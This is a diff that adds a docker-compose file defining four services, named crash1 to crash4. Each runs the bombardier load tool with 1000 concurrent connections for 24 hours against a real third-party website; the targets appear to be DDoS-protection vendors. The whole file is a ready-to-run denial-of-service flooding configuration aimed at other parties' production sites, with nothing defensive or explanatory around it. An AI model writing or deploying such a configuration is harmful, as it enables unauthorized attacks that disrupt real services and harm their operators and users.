@@ -1,0 +1,14 @@
+version: "3.9"
+services:
+  crash1:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://ddos-guard.net/ru"
+  crash2:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://stormwall.pro"
+  crash3:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://qrator.net/ru"
+  crash4:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://solidwall.ru"
